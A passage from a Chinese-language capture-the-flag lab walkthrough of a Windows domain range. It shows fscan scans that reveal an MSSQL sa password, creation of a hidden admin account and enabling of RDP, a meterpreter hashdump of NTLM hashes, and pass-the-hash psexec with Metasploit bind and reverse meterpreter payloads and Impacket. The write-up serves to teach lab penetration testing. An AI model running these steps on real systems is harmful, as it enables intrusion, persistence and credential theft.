class="hljs-number">172.22.8.15:88</span> open<br><span class="hljs-number">172.22.8.46:135</span> open<br><span class="hljs-number">172.22.8.31:135</span> open<br><span class="hljs-number">172.22.8.15:135</span> open<br><span class="hljs-number">172.22.8.18:135</span> open<br><span class="hljs-number">172.22.8.46:80</span> open<br><span class="hljs-number">172.22.8.18:80</span> open<br><span class="hljs-string">[*]</span> alive ports len is: <span class="hljs-number">16</span><br>start vulscan<br><span class="hljs-string">[*]</span> NetInfo <br><span class="hljs-string">[*]</span><span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">8</span>.<span class="hljs-number">18</span><br>   <span class="hljs-string">[-&gt;]</span>WIN-WEB<br>   <span class="hljs-string">[-&gt;]</span><span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">8</span>.<span class="hljs-number">18</span><br><span class="hljs-string">[*]</span> NetBios <span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">8</span>.<span class="hljs-number">15</span>     <span class="hljs-string">[+]</span> DC:XIAORANG\DC01           <br><span class="hljs-string">[*]</span> WebTitle http://<span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">8</span>.<span class="hljs-number">46</span>        code:<span class="hljs-number">200</span> len:<span class="hljs-number">703</span>    title:IIS Windows Server<br><span class="hljs-string">[*]</span> NetInfo <br><span class="hljs-string">[*]</span><span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">8</span>.<span class="hljs-number">31</span><br>   <span class="hljs-string">[-&gt;]</span>WIN19-CLIENT<br>   <span class="hljs-string">[-&gt;]</span><span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">8</span>.<span class="hljs-number">31</span><br><span class="hljs-string">[*]</span> NetInfo <br><span class="hljs-string">[*]</span><span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">8</span>.<span class="hljs-number">15</span><br>   <span class="hljs-string">[-&gt;]</span>DC01<br>   <span class="hljs-string">[-&gt;]</span><span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">8</span>.<span class="hljs-number">15</span><br><span class="hljs-string">[*]</span> NetBios <span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">8</span>.<span class="hljs-number">31</span>     XIAORANG\WIN19-CLIENT         <br><span class="hljs-string">[*]</span> NetInfo <br><span class="hljs-string">[*]</span><span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">8</span>.<span class="hljs-number">46</span><br>   <span class="hljs-string">[-&gt;]</span>WIN2016<br>   <span class="hljs-string">[-&gt;]</span><span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">8</span>.<span class="hljs-number">46</span><br><span class="hljs-string">[*]</span> WebTitle http://<span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">8</span>.<span class="hljs-number">18</span>        code:<span class="hljs-number">200</span> len:<span class="hljs-number">703</span>    title:IIS Windows Server<br><span class="hljs-string">[*]</span> NetBios <span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">8</span>.<span class="hljs-number">46</span>     WIN2016.xiaorang.lab                Windows Server <span class="hljs-number">2016</span> Datacenter <span class="hljs-number">14393</span><br><span class="hljs-string">[+]</span> mssql <span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">8</span>.<span class="hljs-number">18</span>:<span class="hljs-number">1433</span>:sa 1qaz!QAZ<br>宸插畬鎴?<span class="hljs-number">16</span>/<span class="hljs-number">16</span><br><span class="hljs-string">[*]</span> 鎵弿缁撴潫,鑰楁椂: <span class="hljs-number">9</span>.9945714s<br></code></pre></td></tr></table></figure>
+
+<p>我们需要打这几个机器</p>
+<figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs accesslog"><span class="hljs-number">172.22.8.18</span> WIN-WEB # 已攻克的本机<br><span class="hljs-number">172.22.8.46</span> WIN2016.xiaorang.lab<br><span class="hljs-number">172.22.8.31</span> XIAORANG\WIN19-CLIENT<br><span class="hljs-number">172.22.8.15</span> XIAORANG\DC01 # 域控<br></code></pre></td></tr></table></figure>
+
+<p>扫一扫31</p>
+<figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs accesslog">C:\Windows\system32&gt;fscan.exe -h <span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">8</span>.<span class="hljs-number">31</span> -p <span class="hljs-number">1</span>-<span class="hljs-number">65535</span><br>fscan.exe -h <span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">8</span>.<span class="hljs-number">31</span> -p <span class="hljs-number">1</span>-<span class="hljs-number">65535</span><br><br>   ___                              _    <br>  / _ \     ___  ___ _ __ __ _  ___| | __ <br> / /_\/____/ __|/ __| &#x27;__/ _` |/ __| |/ /<br>/ /_\\_____\__ \ (__| | | (_| | (__|   &lt;    <br>\____/     |___/\___|_|  \__,_|\___|_|\_\   <br>                     fscan version: <span class="hljs-number">1</span>.<span class="hljs-number">8</span>.<span class="hljs-number">4</span><br>start infoscan<br><span class="hljs-number">172.22.8.31:445</span> open<br><span class="hljs-number">172.22.8.31:139</span> open<br><span class="hljs-number">172.22.8.31:135</span> open<br><span class="hljs-number">172.22.8.31:3389</span> open<br><span class="hljs-number">172.22.8.31:15774</span> open<br><span class="hljs-number">172.22.8.31:47001</span> open<br><span class="hljs-number">172.22.8.31:49676</span> open<br><span class="hljs-number">172.22.8.31:49675</span> open<br><span class="hljs-number">172.22.8.31:49669</span> open<br><span class="hljs-number">172.22.8.31:49668</span> open<br><span class="hljs-number">172.22.8.31:49667</span> open<br><span class="hljs-number">172.22.8.31:49666</span> open<br><span class="hljs-number">172.22.8.31:49665</span> open<br><span class="hljs-number">172.22.8.31:49664</span> open<br><span class="hljs-number">172.22.8.31:49670</span> open<br><span class="hljs-string">[*]</span> alive ports len is: <span class="hljs-number">15</span><br>start vulscan<br><span class="hljs-string">[*]</span> NetBios <span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">8</span>.<span class="hljs-number">31</span>     XIAORANG\WIN19-CLIENT         <br><span class="hljs-string">[*]</span> NetInfo <br><span class="hljs-string">[*]</span><span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">8</span>.<span class="hljs-number">31</span><br>   <span class="hljs-string">[-&gt;]</span>WIN19-CLIENT<br>   <span class="hljs-string">[-&gt;]</span><span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">8</span>.<span class="hljs-number">31</span><br><span class="hljs-string">[*]</span> WebTitle http://<span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">8</span>.<span class="hljs-number">31</span>:<span class="hljs-number">47001</span>  code:<span class="hljs-number">404</span> len:<span class="hljs-number">315</span>    title:Not Found<br>已完成 <span class="hljs-number">14</span>/<span class="hljs-number">15</span> <span class="hljs-string">[-]</span> (<span class="hljs-number">60</span>/<span class="hljs-number">210</span>) rdp <span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">8</span>.<span class="hljs-number">31</span>:<span class="hljs-number">3389</span> administrator sysadmin remote error: tls: access denied <br>已完成 <span class="hljs-number">14</span>/<span class="hljs-number">15</span> <span class="hljs-string">[-]</span> (<span class="hljs-number">120</span>/<span class="hljs-number">210</span>) rdp <span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">8</span>.<span class="hljs-number">31</span>:<span class="hljs-number">3389</span> admin a11111 remote error: tls: access denied <br>已完成 <span class="hljs-number">14</span>/<span class="hljs-number">15</span> <span class="hljs-string">[-]</span> (<span class="hljs-number">179</span>/<span class="hljs-number">210</span>) rdp <span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">8</span>.<span class="hljs-number">31</span>:<span class="hljs-number">3389</span> guest a123456. remote error: tls: access denied <br>已完成 <span class="hljs-number">15</span>/<span class="hljs-number">15</span><br><span class="hljs-string">[*]</span> 扫描结束,耗时: 6m14.2896853s<br></code></pre></td></tr></table></figure>
+
+<p>其实这几台机器都开了RDP</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell">172.22.8.15:3389 open<br>172.22.8.31:3389 open<br>172.22.8.46:3389 open<br>172.22.8.18:3389 open<br></code></pre></td></tr></table></figure>
+
+<p>这里提一嘴，</p>
+<p>在msf和stowaway的shell执行命令都是中文乱码，可以用<code>chcp 65001</code> 解决。<code>chcp 65001</code> 是 Windows 命令提示符（CMD）中的一个指令，用于<strong>切换当前命令行窗口的代码页（Code Page）为 UTF-8 编码</strong>。</p>
+<blockquote>
+<p>原理：</p>
+<p>win和linux默认中文编码不一样，跨平台传输文本文件时，推荐全部转为UTF-8编码。</p>
+<p>简体中文Windows（如中国大陆用户常用的Win10&#x2F;Win7）默认编码是GBK（或GB2312），代码页编号：936，在CMD下常见为<code>chcp 936</code>；英文版Windows等系统如果没有专门设置，默认编码通常是ASCII或其他西欧编码（如1252）。</p>
+<p>现代Linux发行版（如Ubuntu、Kali、CentOS等）<strong>默认编码几乎都是UTF-8</strong>，无论中英文环境。可以用命令<code>locale</code>或<code>echo $LANG</code>查看（通常会看到<code>UTF-8</code>）</p>
+</blockquote>
+<p>通过systeminfo发现IIS这个机子并没有加入域，是工作组环境</p>
+<figure class="highlight nestedtext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs nestedtext"><span class="hljs-attribute">systeminfo</span><br><span class="hljs-attribute"></span><br><span class="hljs-attribute">主机名</span><span class="hljs-punctuation">:</span> <span class="hljs-string">          WIN-WEB</span><br><span class="hljs-attribute">OS 名称</span><span class="hljs-punctuation">:</span> <span class="hljs-string">         Microsoft Windows Server 2016 Datacenter</span><br><span class="hljs-attribute">OS 版本</span><span class="hljs-punctuation">:</span> <span class="hljs-string">         10.0.14393 暂缺 Build 14393</span><br><span class="hljs-attribute">OS 制造商</span><span class="hljs-punctuation">:</span> <span class="hljs-string">       Microsoft Corporation</span><br><span class="hljs-attribute">OS 配置</span><span class="hljs-punctuation">:</span> <span class="hljs-string">         独立服务器</span><br><span class="hljs-attribute">OS 构件类型</span><span class="hljs-punctuation">:</span> <span class="hljs-string">     Multiprocessor Free</span><br><span class="hljs-attribute">注册的所有人</span><span class="hljs-punctuation">:     </span><br><span class="hljs-attribute">注册的组织</span><span class="hljs-punctuation">:</span> <span class="hljs-string">      Aliyun</span><br><span class="hljs-attribute">产品 ID</span><span class="hljs-punctuation">:</span> <span class="hljs-string">         00376-40000-00000-AA947</span><br><span class="hljs-attribute">初始安装日期</span><span class="hljs-punctuation">:</span> <span class="hljs-string">    2022/7/11, 12:46:14</span><br><span class="hljs-attribute">系统启动时间</span><span class="hljs-punctuation">:</span> <span class="hljs-string">    2025/8/1, 19:42:02</span><br><span class="hljs-attribute">系统制造商</span><span class="hljs-punctuation">:</span> <span class="hljs-string">      Alibaba Cloud</span><br><span class="hljs-attribute">系统型号</span><span class="hljs-punctuation">:</span> <span class="hljs-string">        Alibaba Cloud ECS</span><br><span class="hljs-attribute">系统类型</span><span class="hljs-punctuation">:</span> <span class="hljs-string">        x64-based PC</span><br><span class="hljs-attribute">处理器</span><span class="hljs-punctuation">:</span> <span class="hljs-string">          安装了 1 个处理器。</span><br>                  <span class="hljs-attribute">[01]</span><span class="hljs-punctuation">:</span> <span class="hljs-string">Intel64 Family 6 Model 85 Stepping 7 GenuineIntel ~2500 Mhz</span><br><span class="hljs-attribute">BIOS 版本</span><span class="hljs-punctuation">:</span> <span class="hljs-string">       SeaBIOS 449e491, 2014/4/1</span><br><span class="hljs-attribute">Windows 目录</span><span class="hljs-punctuation">:</span> <span class="hljs-string">    C:\Windows</span><br><span class="hljs-attribute">系统目录</span><span class="hljs-punctuation">:</span> <span class="hljs-string">        C:\Windows\system32</span><br><span class="hljs-attribute">启动设备</span><span class="hljs-punctuation">:</span> <span class="hljs-string">        \Device\HarddiskVolume1</span><br><span class="hljs-attribute">系统区域设置</span><span class="hljs-punctuation">:</span> <span class="hljs-string">    zh-cn;中文(中国)</span><br><span class="hljs-attribute">输入法区域设置</span><span class="hljs-punctuation">:</span> <span class="hljs-string">  zh-cn;中文(中国)</span><br><span class="hljs-attribute">时区</span><span class="hljs-punctuation">:</span> <span class="hljs-string">            (UTC+08:00) 北京，重庆，香港特别行政区，乌鲁木齐</span><br><span class="hljs-attribute">物理内存总量</span><span class="hljs-punctuation">:</span> <span class="hljs-string">    3,950 MB</span><br><span class="hljs-attribute">可用的物理内存</span><span class="hljs-punctuation">:</span> <span class="hljs-string">  1,180 MB</span><br><span class="hljs-attribute">虚拟内存</span><span class="hljs-punctuation">:</span> <span class="hljs-string">最大值: 4,654 MB</span><br><span class="hljs-attribute">虚拟内存</span><span class="hljs-punctuation">:</span> <span class="hljs-string">可用:   684 MB</span><br><span class="hljs-attribute">虚拟内存</span><span class="hljs-punctuation">:</span> <span class="hljs-string">使用中: 3,970 MB</span><br><span class="hljs-attribute">页面文件位置</span><span class="hljs-punctuation">:</span> <span class="hljs-string">    C:\pagefile.sys</span><br><span class="hljs-attribute">域</span><span class="hljs-punctuation">:</span> <span class="hljs-string">              WORKGROUP</span><br><span class="hljs-attribute">登录服务器</span><span class="hljs-punctuation">:</span> <span class="hljs-string">      暂缺</span><br><span class="hljs-attribute">修补程序</span><span class="hljs-punctuation">:</span> <span class="hljs-string">        安装了 6 个修补程序。</span><br>                  <span class="hljs-attribute">[01]</span><span class="hljs-punctuation">:</span> <span class="hljs-string">KB5013625</span><br>                  <span class="hljs-attribute">[02]</span><span class="hljs-punctuation">:</span> <span class="hljs-string">KB4049065</span><br>                  <span class="hljs-attribute">[03]</span><span class="hljs-punctuation">:</span> <span class="hljs-string">KB4486129</span><br>                  <span class="hljs-attribute">[04]</span><span class="hljs-punctuation">:</span> <span class="hljs-string">KB4486131</span><br>                  <span class="hljs-attribute">[05]</span><span class="hljs-punctuation">:</span> <span class="hljs-string">KB5014026</span><br>                  <span class="hljs-attribute">[06]</span><span class="hljs-punctuation">:</span> <span class="hljs-string">KB5013952</span><br><span class="hljs-attribute">网卡</span><span class="hljs-punctuation">:</span> <span class="hljs-string">            安装了 1 个 NIC。</span><br>                  <span class="hljs-attribute">[01]</span><span class="hljs-punctuation">:</span> <span class="hljs-string">Red Hat VirtIO Ethernet Adapter</span><br>                      <span class="hljs-attribute">连接名</span><span class="hljs-punctuation">:</span> <span class="hljs-string">     以太网</span><br>                      <span class="hljs-attribute">启用 DHCP</span><span class="hljs-punctuation">:</span> <span class="hljs-string">  是</span><br>                      <span class="hljs-attribute">DHCP 服务器</span><span class="hljs-punctuation">:</span> <span class="hljs-string">172.22.255.253</span><br>                      <span class="hljs-attribute">IP 地址</span><br><span class="hljs-attribute">                        [01]</span><span class="hljs-punctuation">:</span> <span class="hljs-string">172.22.8.18</span><br>                        <span class="hljs-attribute">[02]</span><span class="hljs-punctuation">:</span> <span class="hljs-string">fe80::ddf8:a19e:7ee0:c712</span><br><span class="hljs-attribute">Hyper-V 要求</span><span class="hljs-punctuation">:</span> <span class="hljs-string">    已检测到虚拟机监控程序。将不显示 Hyper-V 所需的功能。</span><br></code></pre></td></tr></table></figure>
+
+<blockquote>
+<p>如果显示的是类似<code>域: WORKGROUP</code>（<code>Domain: WORKGROUP</code>），表示<strong>没有加入域</strong>，只是<strong>工作组（Workgroup）成员</strong>，属于“独立主机”。</p>
+<p>如果显示的是像 <code>域: yourdomain.com</code>、<code>Domain: company.local</code>、<code>Domain: ad.example.com</code> 这样的内容，表示<strong>已加入域</strong>。</p>
+</blockquote>
+<p>根据flag1的提示，看一下user sessions：</p>
+<p><code>quser</code> 是 Windows 系统下的一个命令行工具，其作用是<strong>查询当前登录到本地或远程主机上的用户会话信息</strong>，发现John用户远程连上了本机</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">C</span>:\Windows\system32&gt;quser<br><span class="hljs-attribute">quser</span><br> <span class="hljs-attribute">USERNAME</span>              SESSIONNAME        ID  STATE   IDLE TIME  LOGON TIME<br> <span class="hljs-attribute">john</span>                  rdp-tcp#<span class="hljs-number">0</span>           <span class="hljs-number">2</span>  Active       <span class="hljs-number">2</span>:<span class="hljs-number">12</span>  <span class="hljs-number">2025</span>/<span class="hljs-number">8</span>/<span class="hljs-number">1</span> <span class="hljs-number">19</span>:<span class="hljs-number">43</span><br> <span class="hljs-attribute">test</span>$                 rdp-tcp#<span class="hljs-number">94</span>          <span class="hljs-number">3</span>  Active         <span class="hljs-number">15</span>  <span class="hljs-number">2025</span>/<span class="hljs-number">8</span>/<span class="hljs-number">1</span> <span class="hljs-number">21</span>:<span class="hljs-number">11</span><br></code></pre></td></tr></table></figure>
+
+<p>然后netstat 查看连接信息，发现是从内网 <code>172.22.8.31 XIAORANG\WIN19-CLIENT</code> 上连过来的</p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152235312.png" srcset="/img/loading.gif" lazyload alt="image-20250804214755297"></p>
+<p>结合靶场名字，可能在TSclient里有点东西。</p>
+<p><strong>TSclient是什么？</strong></p>
+<p>TSclient在Windows远程桌面（RDP，Terminal  Services）环境中，通常指的是**“Terminal Services  Client”**，也就是进行远程桌面连接的客户端。它不是一个具体的软件名称，而是Windows远程桌面连接（mstsc.exe）在内部或者资源管理器中对远程连接客户端的一种标识。</p>
+<p><strong>TSclient挂载远程盘是什么？</strong></p>
+<p>当你使用远程桌面（RDP）连接到一台Windows主机时，在连接设置里可以选择“本地资源”→“驱动器”，把你本地电脑的C盘、D盘等磁盘<strong>映射&#x2F;重定向</strong>到远程桌面会话中。</p>
+<p>这样，远程主机上会在“此电脑”或“资源管理器”里看到类似以下的磁盘：</p>
+<ul>
+<li>C on TSclient</li>
+<li>D on TSclient</li>
+<li>U on TSclient</li>
+</ul>
+<p>这些其实是你本地电脑的C盘、D盘、U盘，通过远程桌面协议（RDP）被“挂载”到了远程主机上。你在远程桌面上操作这些磁盘，实际上读写的还是你本地电脑的数据。</p>
+<p><strong>作用</strong></p>
+<ul>
+<li>方便在本地和远程主机之间进行文件复制、移动、拖拽等操作。</li>
+<li>文件传输不用再用U盘、网盘等额外工具。</li>
+</ul>
+<p>为了方便理解，我们在18这台机器上演示一下远程桌面。先建立新用户，并开启远程登陆</p>
+<figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile">net <span class="hljs-keyword">user</span> matrix Matrix2025! /<span class="hljs-keyword">add</span><span class="language-bash"></span><br><span class="language-bash">net localgroup administrators matrix /add</span><br>REG <span class="hljs-keyword">ADD</span><span class="language-bash"> HKLM\SYSTEM\CurrentControlSet\Control\Terminal<span class="hljs-string">&quot; &quot;</span>Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f</span><br><br><span class="hljs-comment"># 运行结果</span><br>C:\Windows\system32&gt;net <span class="hljs-keyword">user</span> matrix Matrix2025! /<span class="hljs-keyword">add</span><span class="language-bash"></span><br><span class="language-bash">net user matrix Matrix2025! /add</span><br>The command completed successfully.<br>C:\Windows\system32&gt;net localgroup administrators matrix /<span class="hljs-keyword">add</span><span class="language-bash"></span><br><span class="language-bash">net localgroup administrators matrix /add</span><br>The command completed successfully.<br>C:\Windows\system32&gt;REG <span class="hljs-keyword">ADD</span><span class="language-bash"> HKLM\SYSTEM\CurrentControlSet\Control\Terminal<span class="hljs-string">&quot; &quot;</span>Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f</span><br>REG <span class="hljs-keyword">ADD</span><span class="language-bash"> HKLM\SYSTEM\CurrentControlSet\Control\Terminal<span class="hljs-string">&quot; &quot;</span>Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f</span><br>The operation completed successfully.<br></code></pre></td></tr></table></figure>
+
+<p>Kali连接18的远程桌面：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 比较老的工具，这里不好使，不推荐</span><br>rdesktop 39.99.228.12 -u matrix -p Matrix2025!<br><span class="hljs-comment"># 比较新，推荐</span><br>xfreerdp3 /u:matrix /p:Matrix2025! /v:39.99.228.12 /cert:ignore<br></code></pre></td></tr></table></figure>
+
+<p>我们上面根据flag1的<code>Maybe you should focus on user sessions...</code>，发现了有远程登陆；而题目名称是TSclient，我们下一步应该是访问 <code>\\tsclient</code>的远程共享内容。</p>
+<p>怎么看远程共享内容呢？这里有两种方法。</p>
+<p>第一种方法，先模拟 John 用户的令牌，然后访问 <code>\\tsclient</code>共享 (172.22.8.31)</p>
+<p>第二种方法，msf直接migrate到john的svc进程，然后访问</p>
+<h2 id="访问-tsclient"><a href="#访问-tsclient" class="headerlink" title="访问 \\tsclient"></a>访问 <code>\\tsclient</code></h2><h3 id="模拟-John-用户的令牌"><a href="#模拟-John-用户的令牌" class="headerlink" title="模拟 John 用户的令牌"></a>模拟 John 用户的令牌</h3><p>第一种方法，模拟 John 用户的令牌的话，注意需要先 psexec （PTH）连john的帐号再用 msf 上线，之后 incognito 才能成功模拟令牌</p>
+<p>先导出目标Windows主机上所有用户的NTLM哈希，用来pth</p>
+<figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs elixir">meterpreter &gt; hashdump<br><span class="hljs-symbol">Administrator:</span><span class="hljs-number">500</span><span class="hljs-symbol">:aad3b435b51404eeaad3b435b51404ee</span><span class="hljs-symbol">:</span><span class="hljs-number">2</span>caf35bb4c5059a3d50599844e2b9b1f:::<br><span class="hljs-symbol">bridge:</span><span class="hljs-number">1016</span><span class="hljs-symbol">:aad3b435b51404eeaad3b435b51404ee</span><span class="hljs-symbol">:</span><span class="hljs-number">6912928308</span>e3cda903e6d75bd6091a20:::<br><span class="hljs-symbol">DefaultAccount:</span><span class="hljs-number">503</span><span class="hljs-symbol">:aad3b435b51404eeaad3b435b51404ee</span><span class="hljs-symbol">:</span><span class="hljs-number">31</span>d6cfe0d16ae931b73c59d7e0c089c0:::<br><span class="hljs-symbol">Guest:</span><span class="hljs-number">501</span><span class="hljs-symbol">:aad3b435b51404eeaad3b435b51404ee</span><span class="hljs-symbol">:</span><span class="hljs-number">31</span>d6cfe0d16ae931b73c59d7e0c089c0:::<br><span class="hljs-symbol">John:</span><span class="hljs-number">1008</span><span class="hljs-symbol">:aad3b435b51404eeaad3b435b51404ee</span><span class="hljs-symbol">:eec9381b043f098b011be51622282027</span>:::<br><span class="hljs-symbol">matrix:</span><span class="hljs-number">1017</span><span class="hljs-symbol">:aad3b435b51404eeaad3b435b51404ee</span><span class="hljs-symbol">:</span><span class="hljs-number">9</span>f12c506328bbee07e9a3f4c1a8fb7de:::<br>test<span class="hljs-variable">$:</span><span class="hljs-number">1009</span><span class="hljs-symbol">:aad3b435b51404eeaad3b435b51404ee</span><span class="hljs-symbol">:</span><span class="hljs-number">4708</span>ce5d5015a978a1bf96a7a0f9da28::<span class="hljs-symbol">:</span><br></code></pre></td></tr></table></figure>
+
+<p>这里讲两种psexec方法：第一种用msf，第二种用impacket工具集</p>
+<h6 id="？PTH链接"><a href="#？PTH链接" class="headerlink" title="？PTH链接"></a>？PTH链接</h6><h4 id="msf-psexec"><a href="#msf-psexec" class="headerlink" title="msf psexec"></a>msf psexec</h4><p>就是用<code>exploit/windows/smb/psexec</code>模块，这里正反向都试一遍</p>
+<p>正向：</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs routeros">use exploit/windows/smb/psexec<br><span class="hljs-built_in">set</span> RHOSTS 39.99.228.12<br><span class="hljs-built_in">set</span> SMBUser administrator<br><span class="hljs-built_in">set</span> SMBPass aad3b435b51404eeaad3b435b51404ee:2caf35bb4c5059a3d50599844e2b9b1f<br><span class="hljs-built_in">set</span> PAYLOAD windows/x64/meterpreter/bind_tcp<br><span class="hljs-built_in">set</span> LPORT 54524<br>run<br></code></pre></td></tr></table></figure>
+
+<p>反向：</p>
+<p>先stotwaway监听，</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">use</span> <span class="hljs-number">0</span><br><span class="hljs-attribute">backward</span> <span class="hljs-number">54525</span> <span class="hljs-number">54525</span><br></code></pre></td></tr></table></figure>
+
+<p>直接连接</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs routeros">use exploit/windows/smb/psexec<br><span class="hljs-built_in">set</span> RHOSTS 39.99.228.12<br><span class="hljs-built_in">set</span> SMBUser administrator<br><span class="hljs-built_in">set</span> SMBPass aad3b435b51404eeaad3b435b51404ee:2caf35bb4c5059a3d50599844e2b9b1f<br><span class="hljs-built_in">set</span> SMBDomain .<br><span class="hljs-built_in">set</span> PAYLOAD windows/x64/meterpreter/reverse_tcp # 或者<span class="hljs-built_in">set</span> payload windows/meterpreter/reverse_tcp<br><span class="hljs-built_in">set</span> LHOST 127.0.0.1<br><span class="hljs-built_in">set</span> LPORT 54525<br>run<br></code></pre></td></tr></table></figure>
+
+<h4 id="Impacket-psexec"><a href="#Impacket-psexec" class="headerlink" title="Impacket psexec"></a>Impacket psexec</h4><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-comment"># pipx下载impacket工具集之后，可以直接用</span><br><span class="hljs-attribute">proxychains</span> psexec.py -hashes :<span class="hljs-number">2</span>caf35bb4c5059a3d50599844e2b9b1f administrator@<span class="hljs-number">172.22.8.18</span><br><span class="hljs-comment"># Kali也自带impacket工具集</span><br><span class="hljs-attribute">proxychains</span> impacket-psexec -hashes :<span class="hljs-number">2</span>caf35bb4c5059a3d50599844e2b9b1f administrator@<span class="hljs-number">172.22.8.18</span><br></code></pre></td></tr></table></figure>
+
+<p>传一个后门，用连过去的Impacket执行后门，连接</p>
